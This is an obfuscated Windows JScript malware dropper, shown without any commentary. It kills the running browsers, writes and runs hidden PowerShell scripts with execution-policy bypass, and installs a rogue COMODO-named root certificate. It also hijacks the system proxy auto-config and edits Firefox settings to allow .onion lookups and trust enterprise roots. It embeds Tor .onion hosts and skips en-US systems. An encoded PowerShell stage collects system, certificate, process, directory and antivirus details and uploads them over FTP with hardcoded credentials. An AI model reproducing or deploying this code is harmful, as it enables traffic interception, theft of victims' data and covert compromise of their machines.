var Opcgm=null;
var pBGIYAnkrVGDD=null;
var WMkIyQC=null;

var KwpKwFQk = new ActiveXObject("WScript.Shell");
var ILmqJnaRb = new ActiveXObject("Scripting.FileSystemObject");

var BINARY_STREAM_TYPE = 1;
var TEXT_STREAM_TYPE = 2;
var CREATE_OVERWRITE_SAVE_MODE = 2;

var pPzP=KwpKwFQk.ExpandEnvironmentStrings("%TEMP%");
var EPNbDBBCipDjPjL=KwpKwFQk.ExpandEnvironmentStrings("%APPDATA%");
var wZoLNYoX=KwpKwFQk.ExpandEnvironmentStrings("%COMPUTERNAME%");
var Tho=pPzP+"\\"+wZoLNYoX+".log";

var LuTqNHujCwnmK={
	ZVYNwLUidGnoZO: ["yzpayb4sqad7gnin.onion", "bozuniy4sgprvinf.onion", "qr5c2etn6x5lhhfc.onion", "77gxepg2d34nfoid.onion"],
	JbviIuijQwpR: "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",
	ScJdXxGW: "",
	vyOMKczJG: "",
	GRtnT: "",
	pbJK: "JExvZ2ZpbGUgPSAkZW52OlRlbXArIlxcJChnYyBlbnY6Y29tcHV0ZXJuYW1lKS5sb2ciOwoKRnVuY3Rpb24gTG9nV3JpdGUKewogIFBhcmFtIChbc3RyaW5nXSRsb2dzdHJpbmcpCiAgJGR0PUdldC1EYXRlIC1Gb3JtYXQgImRkLk1NLnl5eXkgSEg6bW06c3MiOwogICRtc2c9W3N0cmluZ106OkZvcm1hdCgiW3swfV06Olt7MX1dIiwkZHQsJGxvZ3N0cmluZyk7CiAgV3JpdGUtSG9zdCAkbXNnOwogIEFkZC1jb250ZW50ICRMb2dmaWxlIC12YWx1ZSAkbXNnOwp9CkZ1bmN0aW9uIFVwbG9hZExvZwp7CiAgJGRlc3QgPSAiZnRwOi8vZXMwMDItMTc3MzpXSjJ0RDZpQjFkT2NAc3YxMi5lLXNob3BzLmpwL2h0dHBkb2NzL2xvZ3MiOwogICR3YyA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5OZXQuV2ViQ2xpZW50OwogICR3Yy5VcGxvYWRGaWxlKCIkZGVzdC8kKGdjIGVudjpjb21wdXRlcm5hbWUpLmxvZyIsICRMb2dmaWxlKTsKICBSZW1vdmUtSXRlbSAtUGF0aCAkTG9nZmlsZTsKfQpmdW5jdGlvbiBDaGVja0luc3RhbGwoKXsKICAkd2luaW5mbyA9IChHZXQtV21pT2JqZWN0IFdpbjMyX09wZXJhdGluZ1N5c3RlbSB8IFNlbGVjdCBDYXB0aW9uLCBTZXJ2aWNlUGFja01ham9yVmVyc2lvbiwgT1NBcmNoaXRlY3R1cmUsIFZlcnNpb24sIE1VSUxhbmd1YWdlcyk7CiAgJHdpbmluZm8uTVVJTGFuZ3VhZ2VzPSR3aW5pbmZvLk1VSUxhbmd1YWdlcyAtam9pbiAiLCI7CiAgTG9nV3JpdGUoIk9TIGluZm86IHswfSIgLWYgJHdpbmluZm8gLWpvaW4gIiIpOwogIGlmICh0ZXN0LXBhdGggdmFyaWFibGU6cHN2ZXJzaW9udGFibGUpIHsKICAgICR2ZXJzaW9uID0gJHBzdmVyc2lvbnRhYmxlLnBzdmVyc2lvbjsKICB9IGVsc2UgewogICAgJHZlcnNpb24gPSBbdmVyc2lvbl0iMS4wLjAuMCI7CiAgfQogIExvZ1dyaXRlKCJQb3dlcnNoZWxsIHZlcnNpb246IHswfSIgLWYgJHZlcnNpb24pOwogIHRyeSB7CiAgICAkcGFjPUdldC1JdGVtUHJvcGVydHkgJ2hrY3U6XFNvZnR3YXJlXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxJbnRlcm5ldCBTZXR0aW5nc1wnfFNlbGVjdCAtZXhwYW5kIEF1dG9Db25maWdVUkwgLUVycm9yQWN0aW9uIFN0b3A7CiAgICBMb2dXcml0ZSgiUGFjIHNldHRlZDogJyRwYWMnIik7CiAgfQogIGNhdGNoIHsKICAgIExvZ1dyaXRlKCJFUlJPUjogUGFjIG5vdCBzZXR0ZWQiKTsKICB9CiAgJENlcnRzID0gQChHZXQtQ2hpbGRJdGVtIGNlcnQ6XEN1cnJlbnRVc2VyXFJPT1R8V2hlcmUtT2JqZWN0IHskXy5TdWJqZWN0IC1saWtlICIqQ09NT0RPIFJTQSBFeHRlbmRlZCBWYWxpZGF0aW9uIFNlY3VyZSBTZXJ2ZXIgQ0EgMioiIC1vciAkXy5TdWJqZWN0IC1saWtlICIqQ09NT0RPIENlcnRpZmljYXRpb24gQXV0aG9yaXR5KiJ9fEZvckVhY2gtT2JqZWN0IHsiezB9ICh7MX0pIiAtZiAoJF8uVGh1bWJwcmludCwkXy5Ob3RCZWZvcmUpfSk7CiAgaWYgKC1OT1QgJENlcnRzLmNvdW50IC1lcSAwKXsKICAgIExvZ1dyaXRlKCJDZXJ0cyBpbnN0YWxsZWQ6ICd7MH0nIiAtZiAoJENlcnRzIC1qb2luICI7ICIpKTsKICB9ZWxzZSB7CiAgICBMb2dXcml0ZSgiQ2VydHMgbm90IGZvdW5kIik7CiAgfQogIHRyeXsKICAgICRwcm9jID0gR2V0LVByb2Nlc3MgfCBXaGVyZS1PYmplY3QgeyRfLlByb2Nlc3NOYW1lIC1saWtlICJ0b3IqIiAtb3IgJF8uUHJvY2Vzc05hbWUgLWxpa2UgInNvY2F0KiJ9fFNlbGVjdCAtUHJvcGVydHkgQHsgTmFtZT0iT3V0IjsgRXhwcmVzc2lvbj17IklEOnswfWBuTmFtZTp7MX1gblBhdGg6ezJ9YG4tLS0tLS0tLS0tLS0tIiAtZiAkXy5JZCwkXy5Qcm9jZXNzTmFtZSwkXy5QYXRofX18U2VsZWN0IC1leHBhbmQgT3V0OwogICAgTG9nV3JpdGUoIlByb2NjZXNzIGxpc3Q6YG57MH0iIC1mICgkcHJvYyAtam9pbiAiYG4iKSk7CiAgfQogIGNhdGNoIHsKICAgIExvZ1dyaXRlKCJFUlJPUjogQ2FuJ3QgZ2V0IHByb2NjZXNzIGxpc3QiKTsKICB9CiAgJERlc3RUUD0kZW52OkFMTFVTRVJTUFJPRklMRTsKICB0cnl7CiAgICAkZGlycz1kaXIoJERlc3RUUCkgLUVycm9yQWN0aW9uIFN0b3A7CiAgICBMb2dXcml0ZSgiTGlzdCBkaXIgW3swfV06IHsxfSIgLWYgKCREZXN0VFAsICgoJGRpcnN8U2VsZWN0IC1leHBhbmQgTmFtZSkgLWpvaW4gIjsgIikpKTsKICAgIGZvcmVhY2goJGRpciBpbiAkZGlycyl7CiAgICAgICAgdHJ5ewogICAgICAgICAgICAkc3ViZGlyPWRpcigkZGlyLkZ1bGxOYW1lKSAtRXJyb3JBY3Rpb24gU3RvcDsKICAgICAgICAgICAgTG9nV3JpdGUoIkxpc3QgZGlyIFt7MH1dOnsxfSIgLWYgKCRkaXIuRnVsbE5hbWUsICgoJHN1YmRpcnxTZWxlY3QgLWV4cGFuZCBOYW1lKSAtam9pbiAiOyAiKSkpOwogICAgICAgIH0KICAgICAgICBjYXRjaHsKICAgICAgICAgICAgTG9nV3JpdGUoIkVSUk9SOiBDYW4ndCBsaXN0IGRpciB7MH0iIC1mICRkaXIuRnVsbE5hbWUpOwogICAgICAgIH0KICAgIH0KICB9CiAgY2F0Y2ggewogICAgTG9nV3JpdGUoIkVSUk9SOiBDYW4ndCBsaXN0IGRpciB7MH0iIC1mICREZXN0VFApOwogIH0KCiAgJGF2bGlzdD0oR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlICJyb290XFNlY3VyaXR5Q2VudGVyMiIgLVF1ZXJ5ICJTRUxFQ1QgKiBGUk9NIEFudGlWaXJ1c1Byb2R1Y3QiICBAcHNib3VuZHBhcmFtZXRlcnN8U2VsZWN0IC1leHBhbmQgRGlzcGxheU5hbWUpOwogIGlmICgtTk9UICRhdmxpc3QuY291bnQgLWVxIDApewogICAgTG9nV3JpdGUoIkF2IGZvdW5kOiAnezB9JyIgLWYgKCRhdmxpc3QgLWpvaW4gInwgIikpOwogIH1lbHNlIHsKICAgIExvZ1dyaXRlKCJBdiBub3QgZm91bmQiKTsKICB9Cn0KZnVuY3Rpb24gU3RhcnRXb3JrKCl7CiAgTG9nV3JpdGUgIlN0YXJ0IExvZyBtb2R1bGUiOwogIFN0YXJ0LVNsZWVwIC1zIDM7CiAgQ2hlY2tJbnN0YWxsOwogIFVwbG9hZExvZzsKfQpTdGFydFdvcms7Cg=="
};
var LYqwFCpqVfOQ={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=LYqwFCpqVfOQ._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},btGze:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=LYqwFCpqVfOQ._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/rn/g,"n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}};
var FEaWbpCaknAOVso={
	cGxSl:function(puaCnohBnENBWj,ddrZ){
		var ZvuSYRZktRZVdN = new ActiveXObject("ADODB.Stream");
		ZvuSYRZktRZVdN.Open();
		ZvuSYRZktRZVdN.Type=BINARY_STREAM_TYPE;
		
		var JpwnoPOQ = new ActiveXObject("ADODB.Recordset");
		var fUYMpiz=ddrZ.length*2;
		JpwnoPOQ.Fields.Append("data",204,fUYMpiz,0x80);
		JpwnoPOQ.Open();
		JpwnoPOQ.AddNew();
		JpwnoPOQ.Fields("data").AppendChunk(ddrZ);
		JpwnoPOQ.Update();
		JpwnoPOQ.MoveFirst();
		var binArray = JpwnoPOQ("data").GetChunk(fUYMpiz);
		JpwnoPOQ.Close();

		eval("ZvuSYRZktRZVdN.Wri" + "te(bin"+"Array)");
		ZvuSYRZktRZVdN.Position=0;
		
		if(ILmqJnaRb.FileExists(puaCnohBnENBWj)){
			ILmqJnaRb.DeleteFile(puaCnohBnENBWj);
		}
		ZvuSYRZktRZVdN.SaveToFile(puaCnohBnENBWj);
		ZvuSYRZktRZVdN.Close();
		
		var outStreamA = new ActiveXObject("ADODB.Stream");
		var outStreamB = new ActiveXObject("ADODB.Stream");
		outStreamA.Type=TEXT_STREAM_TYPE;
		outStreamB.Type=TEXT_STREAM_TYPE;
		outStreamB.Charset = "ISO-8859-1";
		outStreamA.Open();
		outStreamB.Open();
		outStreamA.LoadFromFile(puaCnohBnENBWj);
		outStreamA.Position = 0; 
		outStreamA.CopyTo(outStreamB);
		outStreamA.Close();
		outStreamB.SaveToFile(puaCnohBnENBWj,CREATE_OVERWRITE_SAVE_MODE);
		outStreamB.Close();
	},
	elDYmjftx: function(m, n){
	    m = parseInt(m,10);
	    n = parseInt(n,10);
	    return Math.floor(Math.random() * (n - m + 1)) + m;
	},
	lqMaq: function(VrXUleB, QlfVHyZjqtK){
        var BmNZYLGnslD = 0;
        var CUzkuGl = "";
        var iSFQGl;
        if (QlfVHyZjqtK === undefined) {
            QlfVHyZjqtK = false;
        }
        while (BmNZYLGnslD < VrXUleB) {
            iSFQGl = (Math.floor((Math.random() * 100)) % 94) + 33;
            if (!QlfVHyZjqtK) {
                if ((iSFQGl >= 33) && (iSFQGl <= 47)) {
                    continue;
                }
                if ((iSFQGl >= 58) && (iSFQGl <= 64)) {
                    continue;
                }
                if ((iSFQGl >= 91) && (iSFQGl <= 96)) {
                    continue;
                }
                if ((iSFQGl >= 123) && (iSFQGl <= 126)) {
                    continue;
                }
            }
            BmNZYLGnslD++;
            CUzkuGl += String.fromCharCode(iSFQGl);
        }
        return CUzkuGl;
    },
    xoeXaWl: function(str){
        return str.replace(/(^\s+)|(\s+$)/g, "");

		
    }
};
if (!String.format) {
  String.format = function(format) {
    var args = Array.prototype.slice.call(arguments, 1);
    return format.replace(/{(\d+)}/g, function(match, number) { 
      return typeof args[number] != "undefined"
        ? args[number] 
        : match
      ;
    });
  };
}
function APJueqSAOIgm(){
	this.GrAFx=FEaWbpCaknAOVso.lqMaq(8)+".ps1";
	
	this.rIMulNWDuM=function(){
		var ZHOyrYuCEO = new ActiveXObject("MSXML2"+".XML"+"hxxp");
		try{
			ZHOyrYuCEO.open("GET","hxxp://api.ipify.org/",false);
			ZHOyrYuCEO.send();
			if(ZHOyrYuCEO.status==200){
				return FEaWbpCaknAOVso.xoeXaWl(ZHOyrYuCEO.responseText);
			}
		}catch(e){}
		try{
			ZHOyrYuCEO.open("GET","hxxp://icanhazip.com/",false);
			ZHOyrYuCEO.send();
			if(ZHOyrYuCEO.status==200){
				return FEaWbpCaknAOVso.xoeXaWl(ZHOyrYuCEO.responseText);
			}
		}catch(e){}
		return "";
	};
	
	this.uFHRdMZP=function(){
		KwpKwFQk.RegWrite(LYqwFCpqVfOQ.btGze("SEtDV"+"VxTb2Z0d2FyZVxNaWNyb3NvZ"+"nRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm"+"5ldCBTZXR0aW5nc1xBdXRvRGV0ZWN0"),0,"REG_DWORD");
		
		for(var i=0;i<5;i++){
			var SnGpMPfVVvMNV=this.rIMulNWDuM();
			if(SnGpMPfVVvMNV.length>0){
				this.qsJmPDdxdYQMRZV(String.format("hxxp://127.0.0.1:37031/{0}.js?ip={1}",FEaWbpCaknAOVso.lqMaq(8),SnGpMPfVVvMNV));
			}
		}
	};
	this.qsJmPDdxdYQMRZV=function(s){
		KwpKwFQk.RegWrite(LYqwFCpqVfOQ.btGze("SEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5nc1xBdXRvQ29uZmlnVVJM"),s,"REG_SZ");
	};
	this.OCrUNBmouNO=function(){
		this.GrAFx=pPzP+"\\"+this.GrAFx;
		var ddrZ=LYqwFCpqVfOQ.btGze(LuTqNHujCwnmK.ScJdXxGW);
		ddrZ=ddrZ.replace("%CERT%",LuTqNHujCwnmK.JbviIuijQwpR);
		FEaWbpCaknAOVso.cGxSl(this.GrAFx,ddrZ);
		KwpKwFQk.Run("cmd /c powershell -ep Unrestricted -f \""+this.GrAFx+"\" | find /v \"\" >> \""+Tho+"\"",0,true);
	};
	this.HkI=function(){
		if(ILmqJnaRb.FileExists(this.GrAFx)){
			ILmqJnaRb.DeleteFile(this.GrAFx);
		}
	};
}
function tFptnsREyVtkRJB(){
	var vpK = EPNbDBBCipDjPjL + "\\Mozilla\\Firefox\\Profiles";
	this.uwXQVnyv=FEaWbpCaknAOVso.lqMaq(8)+".ps1";
	
	this.Eue=function(){
		if(ILmqJnaRb.FolderExists(vpK)){
			var ArrFirefoxProfileList=ILmqJnaRb.GetFolder(vpK).SubFolders;
			if(ArrFirefoxProfileList.Count>0){
				var e = new Enumerator(ArrFirefoxProfileList);
				e.moveFirst();
				while (e.atEnd() == false){
					var folder=e.item();
					if(folder.Name.indexOf(".default")>-1){
						return folder.Path;
					}
					e.moveNext();
				}
			}
		}
		return false;
	};
	this.yNndIOONQIsI=function(){
		var UIQKEQxjbN=this.Eue();
		if(UIQKEQxjbN!=false){
			var ZwLAgGVmQjaDq=UIQKEQxjbN+LYqwFCpqVfOQ.btGze("XHByZWZzLmpz");
			if(ILmqJnaRb.FileExists(ZwLAgGVmQjaDq)){
				var ajMoGPBD=ILmqJnaRb.OpenTextFile(ZwLAgGVmQjaDq,1).ReadAll();
				var Xzgarg=ajMoGPBD.split("\n");
				var KKdpHjpZ=[];
				for(var i=0;i<Xzgarg.length;i++){
					if(Xzgarg[i].indexOf("network.dns.blockDotOnion")!=-1){
						Xzgarg[i]=Xzgarg[i].replace("true","false");
					}
					if(Xzgarg[i].indexOf("network.proxy.")==-1 && Xzgarg[i].indexOf("security.enterprise_roots.enabled")==-1){
						KKdpHjpZ.push(Xzgarg[i]);
					}
					
				}
				KKdpHjpZ.push("user_pref(\"network.dns.blockDotOnion\", false);");
				KKdpHjpZ.push("user_pref(\"security.enterprise_roots.enabled\", true);");
				ajMoGPBD=KKdpHjpZ.join("\n");
				var stream=ILmqJnaRb.CreateTextFile(ZwLAgGVmQjaDq, true);
				stream.Write(ajMoGPBD);
				stream.Close();
			}
		}
	};
	this.InstallCert=function(){
		this.uwXQVnyv=pPzP+"\\"+this.uwXQVnyv;
		var ddrZ=LYqwFCpqVfOQ.btGze(LuTqNHujCwnmK.vyOMKczJG);
		ddrZ=ddrZ.replace("%CERT%",LuTqNHujCwnmK.JbviIuijQwpR);
		FEaWbpCaknAOVso.cGxSl(this.uwXQVnyv,ddrZ);
		var ENV_WINDIR=KwpKwFQk.ExpandEnvironmentStrings("%WINDIR%");
		KwpKwFQk.Run("cmd /c powershell -ep bypass -f \""+this.uwXQVnyv+"\" | find /v \"\" >> \""+Tho+"\"",0,true);
		KwpKwFQk.Run("cmd /c "+ENV_WINDIR+"\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass -f \""+this.uwXQVnyv+"\" | find /v \"\" >> \""+Tho+"\"",0,true);
		KwpKwFQk.Run("cmd /c "+ENV_WINDIR+"\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass -f \""+this.uwXQVnyv+"\" | find /v \"\" >> \""+Tho+"\"",0,true);
	};
	this.Close=function(){
		if(ILmqJnaRb.FileExists(this.uwXQVnyv)){
			ILmqJnaRb.DeleteFile(this.uwXQVnyv);
		}
	};
}
function C_TP(){
	this.FileName=FEaWbpCaknAOVso.lqMaq(FEaWbpCaknAOVso.elDYmjftx(5,10))+".ps1";
	this.lTWcYVI=function(){
		var IZeM=FEaWbpCaknAOVso.elDYmjftx(0,LuTqNHujCwnmK.ZVYNwLUidGnoZO.length-1);
		var IEeDsIEDwlExAj=LuTqNHujCwnmK.ZVYNwLUidGnoZO[IZeM];
		this.FileName=KwpKwFQk.ExpandEnvironmentStrings("%ALLUSERSPROFILE%")+"\\"+this.FileName;
		var ddrZ=LYqwFCpqVfOQ.btGze(LuTqNHujCwnmK.GRtnT);
		ddrZ=ddrZ.replace(/%DOMAIN%/g,IEeDsIEDwlExAj);
		FEaWbpCaknAOVso.cGxSl(this.FileName,ddrZ);
		KwpKwFQk.Run("cmd /c powershell -ep Unrestricted -f \""+this.FileName+"\" | find /v \"\" >> \""+Tho+"\"",0,true);
	};
	this.Close=function(){
		if(ILmqJnaRb.FileExists(this.FileName)){
			ILmqJnaRb.DeleteFile(this.FileName);
		}
	};
}
function EDXUfG(){
	this.FileName=pPzP+"\\"+FEaWbpCaknAOVso.lqMaq(8)+".ps1";
	this.FcRYr=function(){
		Opcgm=new APJueqSAOIgm();
		pBGIYAnkrVGDD=new tFptnsREyVtkRJB();
		WMkIyQC=new C_TP();
	};
	this.MvIOCBgYmxRQEB=function(){
		
		if(this.HCjquJsW()){
			
			return false;
			
		}
		this.FcRYr();
		WMkIyQC.lTWcYVI();
		this.BmsUPwixTCwUd();
		this.eZIhndsUVpRO();
		this.cegxFA();
		this.Close();
		
		this.zdV();
		
	};
	this.eZIhndsUVpRO=function(){
		Opcgm.OCrUNBmouNO();
		Opcgm.uFHRdMZP();
	};
	this.cegxFA=function(){
		pBGIYAnkrVGDD.InstallCert();
		pBGIYAnkrVGDD.yNndIOONQIsI();
	};
	this.BmsUPwixTCwUd=function(){
		KwpKwFQk.Run(LYqwFCpqVfOQ.btGze("dGFza2tpbGwgL0Y"+"gL2ltIGlleHBsb3JlLmV4ZQ=="),0,false);
		KwpKwFQk.Run(LYqwFCpqVfOQ.btGze("dGFza2tpbGwgL0Yg"+"L2ltIGZpcmVmb3guZXhl"),0,false);
		KwpKwFQk.Run(LYqwFCpqVfOQ.btGze("dGFza2tpbGwgL0YgL"+"2ltIGNocm9tZS5leGU="),0,false);
	};
	this.zdV=function(){
		var bData=LYqwFCpqVfOQ.btGze(LuTqNHujCwnmK.pbJK);
		FEaWbpCaknAOVso.cGxSl(this.FileName,bData);
		KwpKwFQk.Run("powershell -ep Unrestricted -f \""+this.FileName+"\"",0,true);
		if(ILmqJnaRb.FileExists(this.FileName)){
			ILmqJnaRb.DeleteFile(this.FileName);
		}
	};
	this.HCjquJsW=function(){
		var wyutAVB = GetObject("winmgmts:\\\\.\\root\\cimv2").ExecQuery("Select * from Win32_OperatingSystem");
		var arr = [];
		for (var enumItems = new Enumerator(wyutAVB) ; !enumItems.atEnd() ; enumItems.moveNext()) {
			var MUILanguages = enumItems.item().MUILanguages.toArray();
			for (i in MUILanguages) {
				arr.push(MUILanguages[i]);
			}
		}
		var muilangs = arr.join(",");
		if(muilangs=='en-US'){
			return true;
		}
		return false;
	};
	this.Close=function(){
		Opcgm.HkI();
		pBGIYAnkrVGDD.Close();
		WMkIyQC.Close();
	};   
}
var kIGj = new EDXUfG();
kIGj.MvIOCBgYmxRQEB();
